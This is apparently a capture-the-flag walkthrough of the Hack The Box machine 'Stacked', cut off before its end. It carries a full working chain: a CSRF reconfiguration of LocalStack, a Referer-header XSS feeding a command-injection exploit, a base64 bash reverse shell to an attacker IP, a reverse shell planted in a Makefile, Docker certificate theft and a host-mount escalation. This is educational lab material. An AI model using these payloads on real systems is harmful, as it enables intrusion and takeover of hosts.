12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 (RSA) | 256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 (ECDSA) |_ 256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: STACKED.HTB 2376/tcp open ssl/docker? | ssl-cert: Subject: commonName=0.0.0.0 | Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1 | Not valid before: 2021-07-17T15:37:02 |_Not valid after: 2022-07-17T15:37:02 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 19.38 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 2376 (Docker) open.\nWeb enumeration There is a domain name called stacked.htb as shown in the nmap output, so we can put it in /etc/hosts. Moreover, http://10.10.11.112 redirects to http://stacked.htb. If we go here, we will see a landing page like this:\nThere is nothing to do here. We can apply fuzzing to enumerate some routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://stacked.htb/FUZZ images [Status: 301, Size: 311, Words: 20, Lines: 10] css [Status: 301, Size: 308, Words: 20, Lines: 10] js [Status: 301, Size: 307, Words: 20, Lines: 10] fonts [Status: 301, Size: 310, Words: 20, Lines: 10] [Status: 200, Size: 5055, Words: 367, Lines: 159] sass [Status: 301, Size: 309, Words: 20, Lines: 10] server-status [Status: 403, Size: 276, Words: 20, Lines: 10]  But nothing interesting at all.\nIf we try to connect to port 2376 using curl we discover that we need client certificates:\n$ curl -k https://10.10.11.112:2376 curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0  Doing some research, we can see that port 2376 is used by Docker when it is configured to be used remotely by other machines. That\u0026rsquo;s why it requires client certificates, as a method of authentication.\nFor the moment, let\u0026rsquo;s continue by enumerating subdomains:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.112 -H 'Host: FUZZ.stacked.htb' -fc 302 portfolio [Status: 200, Size: 30268, Words: 11467, Lines: 445]  Once set this subdomain in /etc/hosts, we can go to http://portfolio.stacked.htb and see this website:\nHere we can download a file called docker-compose.yml which starts a LocalStack environment to mock AWS locally:\nversion: \"3.3\" services: localstack: container_name: \"${LOCALSTACK_DOCKER_NAME-localstack_main}\" image: localstack/localstack-full:0.12.6 network_mode: bridge ports: - \"127.0.0.1:443:443\" - \"127.0.0.1:4566:4566\" - \"127.0.0.1:4571:4571\" - \"127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}\" environment: - SERVICES=serverless - DEBUG=1 - DATA_DIR=/var/localstack/data - PORT_WEB_UI=${PORT_WEB_UI- } - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- } - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- } - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- } - DOCKER_HOST=unix:///var/run/docker.sock - HOST_TMP_FOLDER=\"/tmp/localstack\" volumes: - \"/tmp/localstack:/tmp/localstack\" - \"/var/run/docker.sock:/var/run/docker.sock\"  This file configures a container that exposes ports 443, 4566, 4571 and 8080 to interact with LocalStack. We can start it using docker-compose up:\n$ docker-compose up [+] Running 1/0 ⠿ Container localstack_main Created 0.0s Attaching to localstack_main localstack_main | Waiting for all LocalStack services to be ready ... localstack_main | Ready. localstack_main | INFO:localstack.utils.analytics.profiler: Execution of \"start_api_services\" took 27272.037982940674ms  And we have all services ready:\n$ curl localhost:4566 {\"status\": \"running\"}  Compromising LocalStack. MITM proxy It is possible to install a MITM proxy and control requests and responses from LocalStack. It is show-cased in SonarSource and PortSwigger. Although the attack is explained, there is no exploit available, so we must build it by hand.\nThe first step is a Cross-Site Request Forgery (CSRF). The purpose is that the victim user accesses our malicious website and this website performs a request to http://127.0.0.1:4566 to talk to LocalStack and configure some variables.\nLocalStack allows Cross-Origin Resource Sharing (CORS) to any host, so the Same-Origin Policy will not block the HTTP responses and we will be able to read the responses from LocalStack.\nLet\u0026rsquo;s start by creating a simple index.html file that calls a csrf.js script:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;LocalStack Exploit\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script src=\"csrf.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  fetch('http://127.0.0.1:4566') .then(res =\u0026gt; res.text()) .then(console.log)  This is a simple way to know if we receive the response from LocalStack using CSRF. We start a Python web server on port 8000 and access the malicious website on host 172.16.33.1:8000 (simulating the victim user accessing the malicious website):\n$ python3 -m http.server 8000 Serving HTTP on :: port 8000 (http://[::]:8000/) ... ::ffff:172.16.33.1 - - [] \"GET / HTTP/1.1\" 200 - ::ffff:172.16.33.1 - - [] \"GET /csrf.js HTTP/1.1\" 200 - ::ffff:172.16.33.1 - - [] \"GET /csrf.js HTTP/1.1\" 200 - ::ffff:172.16.33.1 - - [] code 404, message File not found ::ffff:172.16.33.1 - - [] \"GET /favicon.ico HTTP/1.1\" 404 -  Now we can configure some variables: set FORWARD_EDGE_INMEM to False and HOSTNAME to our malicious IP address (172.16.33.1) in this way.\nfetch('http://127.0.0.1:4566') .then(res =\u0026gt; res.text()) .then(console.log) fetch('http://127.0.0.1:4566/?_config_', { body: JSON.stringify({ variable: 'FORWARD_EDGE_INMEM', value: false }), headers: { 'Content-Type': 'application/json' }, method: 'post' }) .then(res =\u0026gt; res.text()) .then(console.log) fetch('http://127.0.0.1:4566/?_config_', { body: JSON.stringify({ variable: 'HOSTNAME', value: '172.16.33.1' }), headers: { 'Content-Type': 'application/json' }, method: 'post', }) .then(res =\u0026gt; res.text()) .then(console.log)  And we see that LocalStack responds:\nMoreover, the variables are shown in the log:\nlocalstack_main | INFO:localstack.services.infra: Updating value of config variable \"HOSTNAME\": 172.16.33.1 localstack_main | INFO:localstack.services.infra: Updating value of config variable \"FORWARD_EDGE_INMEM\": False  Now we have configured LocalStack so that every request comes to our controlled IP address. We can verify it using nc:\n$ nc -nlvp 4566 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4566 Ncat: Listening on 0.0.0.0:4566 Ncat: Connection from 172.16.33.1. Ncat: Connection from 172.16.33.1:56875. GET /shell/ HTTP/1.1 Remote-Addr: 172.17.0.1 Host: localhost:4566 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 If-Modified-Since: Thu, 28 May 2020 17:39:06 GMT Cache-Control: max-age=0 X-Forwarded-For: 172.17.0.1, localhost:4566 x-localstack-edge: https://localhost:4566 Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234  And if we go to http://localhost:4566/shell/ (legitimate website), we see nothing:\n$ curl http://localhost:4566/shell/ {}  Now we control the responses. We can build a simple Python HTTP server using Flask:\n#!/usr/bin/env python3 from flask import Flask, request app = Flask(__name__) @app.route('/shell/') def shell(): print(request.headers) return 'Hacked!!' if __name__ == '__main__': app.run(host='172.16.33.1', port=4566)  $ python3 app.py * Serving Flask app 'app' (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off * Running on http://172.16.33.1:4566/ (Press CTRL+C to quit) Remote-Addr: 172.17.0.1 Host: localhost:4566 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Cache-Control: max-age=0 X-Forwarded-For: 172.17.0.1, localhost:4566 X-Localstack-Edge: https://localhost:4566 Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234 172.16.33.1 - - [] \"GET /shell/ HTTP/1.1\" 200 -  With this, we have full control over requests and responses from LocalStack.\nCompromising LocalStack. RCE There is also an attack vector that can lead to Remote Code Execution (RCE) on the container when going to /lambda/\u0026lt;functionName\u0026gt;/code (parameter functionName is has a command injection vulnerability) using a POST request (also show-cased in SonarSource).\nTo test it, I will restart the Docker container and use this request:\n$ curl '127.0.0.1:8080/lambda/;curl%20172.16.33.1/code' -d '{\"awsEnvironment\":\"\"}' -H 'Content-Type: application/json' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.\u0026lt;/p\u0026gt;  And we receive a hit:\n$ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 172.16.33.1. Ncat: Connection from 172.16.33.1:50609. GET / HTTP/1.1 Host: 172.16.33.1 User-Agent: curl/7.67.0 Accept: */*  Hence, we could even get a reverse shell on the container.\nFinding XSS We can assume that the machine has a LocalStack environment running, so we can reproduce the attack vector shown in the blog and use XSS to exploit the command injection vulnerability and gain access to the container (MITM proxy exploit is not needed).\nFirst of all we need to find some user input. The only one is a contact form in http://portfolio.stacked.htb:\nIf we try a simple XSS payload, it gets blocked:\nWe can use Burp Suite (Repeater) to test more payloads. I will keep nc listening on port 80 to see if some payload gets executed.\nAfter a lot of attempts, we find out that the Referer header is injectable:\nAnd we receive a request in nc:\n$ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:35146. GET / HTTP/1.1 Host: 10.10.17.44 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://mail.stacked.htb/read-mail.php?id=2 Connection: keep-alive Upgrade-Insecure-Requests: 1  Although we see another subdomain called mail.stacked.htb, we cannot access it. The server redirects:\n$ curl -I mail.stacked.htb HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Location: http://stacked.htb/ Content-Type: text/html; charset=iso-8859-1  Moreover, mail is a common subdomain and ffuf didn\u0026rsquo;t find it.\nFoothold on the container Hence, we will exploit the command injection vulnerability in /lambda/\u0026lt;functionName\u0026gt;/code to get a reverse shell on the container. The reverse shell payload is this one encoded in Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Now we create this JavaScript file (exploit.js) that performs a POST request as shown previously on the local exploitation:\nconst cmd = 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' fetch(`http://127.0.0.1:8080/lambda/;${encodeURIComponent(cmd)}/code`, { body: JSON.stringify({ awsEnvironment: '' }), headers: { 'Content-Type': 'application/json' }, method: 'post' })  Now we can start a Python HTTP server and submit the contact form injecting our XSS payload on the Referer header to load our malicious JavaScript file:\n$ curl portfolio.stacked.htb/process.php -H 'Referer: \u0026lt;script src=\"http://10.10.17.44/exploit.js\"\u0026gt;\u0026lt;/script\u0026gt;' -d 'tel=1\u0026fullname=\u0026email=\u0026subject=\u0026message=' {\"success\":\"Your form has been submitted. Thank you!\"}  The victim\u0026rsquo;s browser requests the file:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.112 - - [] \"GET /exploit.js HTTP/1.1\" 200 -  And we receive the reverse shell connection:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:32822. bash: cannot set terminal process group (20): Not a tty bash: no job control in this shell bash: /root/.bashrc: Permission denied bash-5.0$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' bash: /root/.bashrc: Permission denied bash-5.0$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm bash-5.0$ export TERM=xterm bash-5.0$ export SHELL=bash bash-5.0$ stty rows 50 columns 158  System enumeration The first thing we notice is that we are not root:\nbash-5.0$ whoami localstack  Let\u0026rsquo;s see if there is a shared volume mount with the host machine:\nbash-5.0$ df -h Filesystem Size Used Available Use% Mounted on overlay 7.3G 6.5G 691.7M 91% / tmpfs 64.0M 0 64.0M 0% /dev tmpfs 1.9G 0 1.9G 0% /sys/fs/cgroup /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /tmp/localstack df: /root/.docker: Permission denied /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /etc/resolv.conf /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /etc/hostname /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /etc/hosts shm 64.0M 0 64.0M 0% /dev/shm /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /home/localstack/user.txt tmpfs 1.9G 0 1.9G 0% /proc/acpi tmpfs 64.0M 0 64.0M 0% /proc/kcore tmpfs 64.0M 0 64.0M 0% /proc/keys tmpfs 64.0M 0 64.0M 0% /proc/timer_list tmpfs 64.0M 0 64.0M 0% /proc/sched_debug tmpfs 1.9G 0 1.9G 0% /proc/scsi tmpfs 1.9G 0 1.9G 0% /sys/firmware  Well, we have some mounts (/tmp/localstack into /root/.docker and /home/localstack/user.txt). At this point, we have the user.txt flag:\nbash-5.0$ cat /home/localstack/user.txt c877918fc5f7cb38e0631f7849c20b1b  If we look again at the docker-compose.yml, we find that /tmp/localstack is used as a volume mount. This directory is used to store the client certificates. These files will be useful to connect to Docker on port 2376, so we must escalate to root inside the container.\nPrivilege escalation in the container Let\u0026rsquo;s enumerate running processes executed by root:\nbash-5.0$ ps -a | grep root 1 root 0:00 {docker-entrypoi} /bin/bash /usr/local/bin/docker-entrypoint.sh 14 root 0:15 {supervisord} /usr/bin/python3.8 /usr/bin/supervisord -c /etc/supervisord.conf 17 root 0:05 tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err 21 root 0:00 make infra 24 root 1:19 python bin/localstack start --host 95 root 2:22 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -port 44759 -dbPath /var/localstack/data/dynamodb 107 root 0:00 node /opt/code/localstack/localstack/node_modules/kinesalite/cli.js --shardLimit 100 --port 44677 --createStreamMs 500 --deleteStreamMs 500 --updateStreamMs 500 --path /var/localstack/data/kinesis 159289 localsta 0:00 grep root  There is a make infra command, which executes a list of commands inside a file called Makefile. These are all the files called Makefile in the container:\nbash-5.0$ find / -name Makefile 2\u0026gt;/dev/null /usr/local/lib/node_modules/npm/node_modules/columnify/Makefile /usr/local/lib/node_modules/npm/node_modules/json-stringify-safe/Makefile /usr/local/lib/node_modules/npm/node_modules/extsprintf/Makefile /usr/local/lib/node_modules/npm/node_modules/retry/Makefile /usr/local/lib/node_modules/npm/node_modules/delayed-stream/Makefile /usr/local/lib/node_modules/npm/node_modules/delegates/Makefile /usr/local/lib/node_modules/npm/node_modules/isarray/Makefile /usr/local/lib/node_modules/npm/Makefile /usr/share/groff/1.22.4/font/devlj4/generate/Makefile /usr/share/groff/1.22.4/font/devps/generate/Makefile /usr/share/groff/1.22.4/font/devdvi/generate/Makefile /usr/lib/python3.8/config-3.8-x86_64-linux-gnu/Makefile /opt/code/localstack/localstack/node_modules/leveldown/deps/leveldb/leveldb-1.20/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/debug/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/delayed-stream/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/superagent/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/isarray/Makefile /opt/code/localstack/Makefile  The last one seems more interesting, and indeed we have permissions to modify the file:\nbash-5.0$ ls -l /opt/code/localstack/Makefile -rw-rw-r-- 1 localsta localsta 8455 Feb 1 2021 /opt/code/localstack/Makefile  So we can place a command that executes a reverse shell. But we need to figure out how we will tell root to run make infra, because this type of command is usually run once at the beginning.\nLooking at the LocalStack GitHub project using GitHub Codespaces, we can search for restart:\nAnd we see that there is a way to actually kill the process even if we are not root. Now we can search for kill and find a way to tell LocalStack to restart infra as root:\nWe only need to insert a header called x-localstack-kill. Thus, we will modify the Makefile to add a reverse shell payload and restart the service while listening with nc.\nFirst, we take the file:\nbash-5.0$ nc 10.10.17.44 4444 \u0026lt; /opt/code/localstack/Makefile  $ nc -nlvp 4444 \u0026gt; Makefile_orig Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:40781. $ cp Makefile_orig Makefile_pwn  And now we change it. This is the modified Makefile (called Makefile_pwn locally):\n# ... infra: ## Manually start the local infrastructure for testing echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash ($(VENV_RUN); exec bin/localstack start --host) # ...  Finally, we overwrite the existing one:\nbash-5.0$ curl 10.10.17.44/Makefile_pwn -so /opt/code/localstack/Makefile  Now it is time to restart the service and get access as root:\nbash-5.0$ curl 127.0.0.1:4566 -H 'x-localstack-kill: asdf'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:56628. bash: cannot set terminal process group (159315): Not a tty bash: no job control in this shell bash-5.0# python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' bash-5.0# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm bash-5.0# export TERM=xterm bash-5.0# export SHELL=bash bash-5.0# stty rows 50 columns 158  Privilege escalation on the machine Nice, we are root in the container. Now we can search for the required certificates to interact with Docker exposed on port 2376:\nbash-5.0# find / -name \\*.pem\\* 2\u0026gt;/dev/null | grep -v etc /tmp/localstack/server.test.pem.key /tmp/localstack/server.test.pem.crt /tmp/localstack/server.test.pem /tmp/tmpiwxfx4eh.pem /tmp/tmpiwxfx4eh.pem.crt /tmp/tmpiwxfx4eh.pem.key /usr/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem /usr/lib/python3.8/site-packages/certifi/cacert.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-key.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-crt.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-key.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-crt.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-csr.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.passwd.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/dh512.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert2.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badcert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/https_svn_python_org_root.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_cert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullbytecert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badkey.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nokia.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.passwd.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullcert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/sha256.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/websocket/cacert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/pyftpdlib/test/keycert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/certifi/cacert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_x509.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes128.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_des3.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8_clear.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_public.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes192.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes256_gcm.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/botocore/cacert.pem /root/.local/share/virtualenv/wheel/3.8/image/1/CopyPipInstall/pip-20.3.1-py2.py3-none-any/pip/_vendor/certifi/cacert.pem /root/.docker/key.pem /root/.docker/ca-key.pem /root/.docker/ca.pem /root/.docker/cert.pem  The certificates inside /root/.docker are the right ones. We can take a look at Docker\u0026rsquo;s documentation to know how to interact with a remote Docker using certificates. We can request to show its version:\nbash-5.0# docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376 version Client: Version: 17.05.0-ce API version: 1.29 Go version: go1.7.5 Git commit: 89658be Built: Fri May 5 15:36:11 2017 OS/Arch: linux/amd64 Server: Version: 20.10.8 API version: 1.41 (minimum version 1.12) Go version: go1.16.6 Git commit: 75249d8 Built: Fri Jul 30 19:52:16 2021 OS/Arch: linux/amd64 Experimental: false  Nice, it worked. As a result, we can use Docker as if we where in the host machine.\nNotice that 172.17.0.1 is the IP address of the docker0 interface from the host machine.\nFor convenience, we can set an alias (mydocker) to the large docker command as follows:\nbash-5.0# alias mydocker='docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376'  Using this alias, we can list the running containers:\nbash-5.0# mydocker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 910b69680838 localstack/localstack-full:0.12.6 \"docker-entrypoint.sh\" 20 hours ago Up 20 hours 127.0.0.1:443-\u0026gt;443/tcp, 127.0.0.1:4566-\u0026gt;4566/tcp, 127.0.0.1:4571-\u0026gt;4571/tcp, 127.0.0.1:8080-\u0026gt;8080/tcp localstack_main  It shows only one instance of LocalStack. And we have these images available:\nbash-5.0# mydocker images REPOSITORY TAG IMAGE ID CREATED SIZE localstack/localstack-full 0.12.6 7085b5de9f7c 7 months ago 888MB localstack/localstack-full \u0026lt;none\u0026gt; 0601ea177088 13 months ago 882MB lambci/lambda nodejs12.x 22a4ada8399c 13 months ago 390MB lambci/lambda nodejs10.x db93be728e7b 13 months ago 385MB lambci/lambda nodejs8.10 5754fee26e6e 13 months ago 813MB  The idea here is to run another container and mount the host\u0026rsquo;s filesystem into the container, so that we can add an SSH public key into /root/.ssh/authorized_keys and connect as root via SSH.\nWe can create a pair of keys using ssh-keygen:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:3Nb1eAyClnfVUIvPYp270LB/EspMAcanzxZzNG62UUQ The key's randomart image is: +---[RSA 3072]----+ | . .=E| | +o. +.+| | .++o+++ | | . o.o++X=.| | S oo.@.B+| | . * B..| | = + + | | + + o| | +.| +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/N M5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=  To run a Docker container, we need to specify an image. We can use any of lambci/lambda, but we enter as a non-privileged user, so we won\u0026rsquo;t be able to access files owned by root in the host machine. And we will get some errors if we use localstack/localstack:0.12.6 because of already existing volumes.\nTherefore, we must find a way to create a custom Docker image. Since the host machine has no Internet connection, we need to use an existing image as a base. There is a built-in image in Docker called scratch that is just an empty container.\nTo actually create an image from scratch we need to copy some binaries inside. And to make the binaries work, we also need to copy some shared libraries (i.e. Glibc).\nWe will copy binaries /bin/sh, /bin/cat and /bin/echo so that I can use a shell prompt and perform read and write operations. These binaries use the same shared library:\nbash-5.0# ldd /bin/sh /lib/ld-musl-x86_64.so.1 (0x7f43b9444000) libc.musl-x86_64.so.1 =\u0026gt; /lib/ld-musl-x86_64.so.1 (0x7f43b9444000) bash-5.0# ldd /bin/cat /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000) libc.musl-x86_64.so.1 =\u0026gt; /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000) bash-5.0# ldd /bin/echo /lib/ld-musl-x86_64.so.1 (0x7f691e268000) libc.musl-x86_64.so.1 =\u0026gt; /lib/ld-musl-x86_64.so.1 (0x7f691e268000)  So, the Dockerfile used to build the image is this one:\nFROM scratch WORKDIR /bin COPY sh . COPY cat . COPY echo . WORKDIR /lib COPY ld-musl-x86_64.so.1 .  We will copy all these files to the current working directory and build the image from there as well. The image is called pwn:\nbash-5.0# echo -e 'FROM scratch\\nWORKDIR /bin\\nCOPY sh .\\nCOPY cat .\\nCOPY echo .\\nWORKDIR /lib\\nCOPY ld-musl-x86_64.so.1 .' \u0026gt; Dockerfile bash-5.0# cp /bin/sh . bash-5.0# cp /bin/cat . bash-5.0# cp /bin/echo . bash-5.0# cp /lib/ld-musl-x86_64.so.1 . bash-5.0# mydocker build -t pwn . Sending build context to Docker daemon 3.882MB Step 1/7 : FROM scratch ---\u0026gt; Step 2/7 : WORKDIR /bin ---\u0026gt; Running in 59c11f6289e3 Removing intermediate container 59c11f6289e3 ---\u0026gt; 2d5ecb48eafb Step 3/7 : COPY sh . ---\u0026gt; 5d2277fa1fb4 Step 4/7 : COPY cat . ---\u0026gt; 52a4554cb022 Step 5/7 : COPY echo . ---\u0026gt; 11c3ea334ad7 Step 6/7 : WORKDIR /lib ---\u0026gt; Running in d7554e33572d Removing intermediate container d7554e33572d ---\u0026gt; d9142f99a2e0 Step 7/7 : COPY 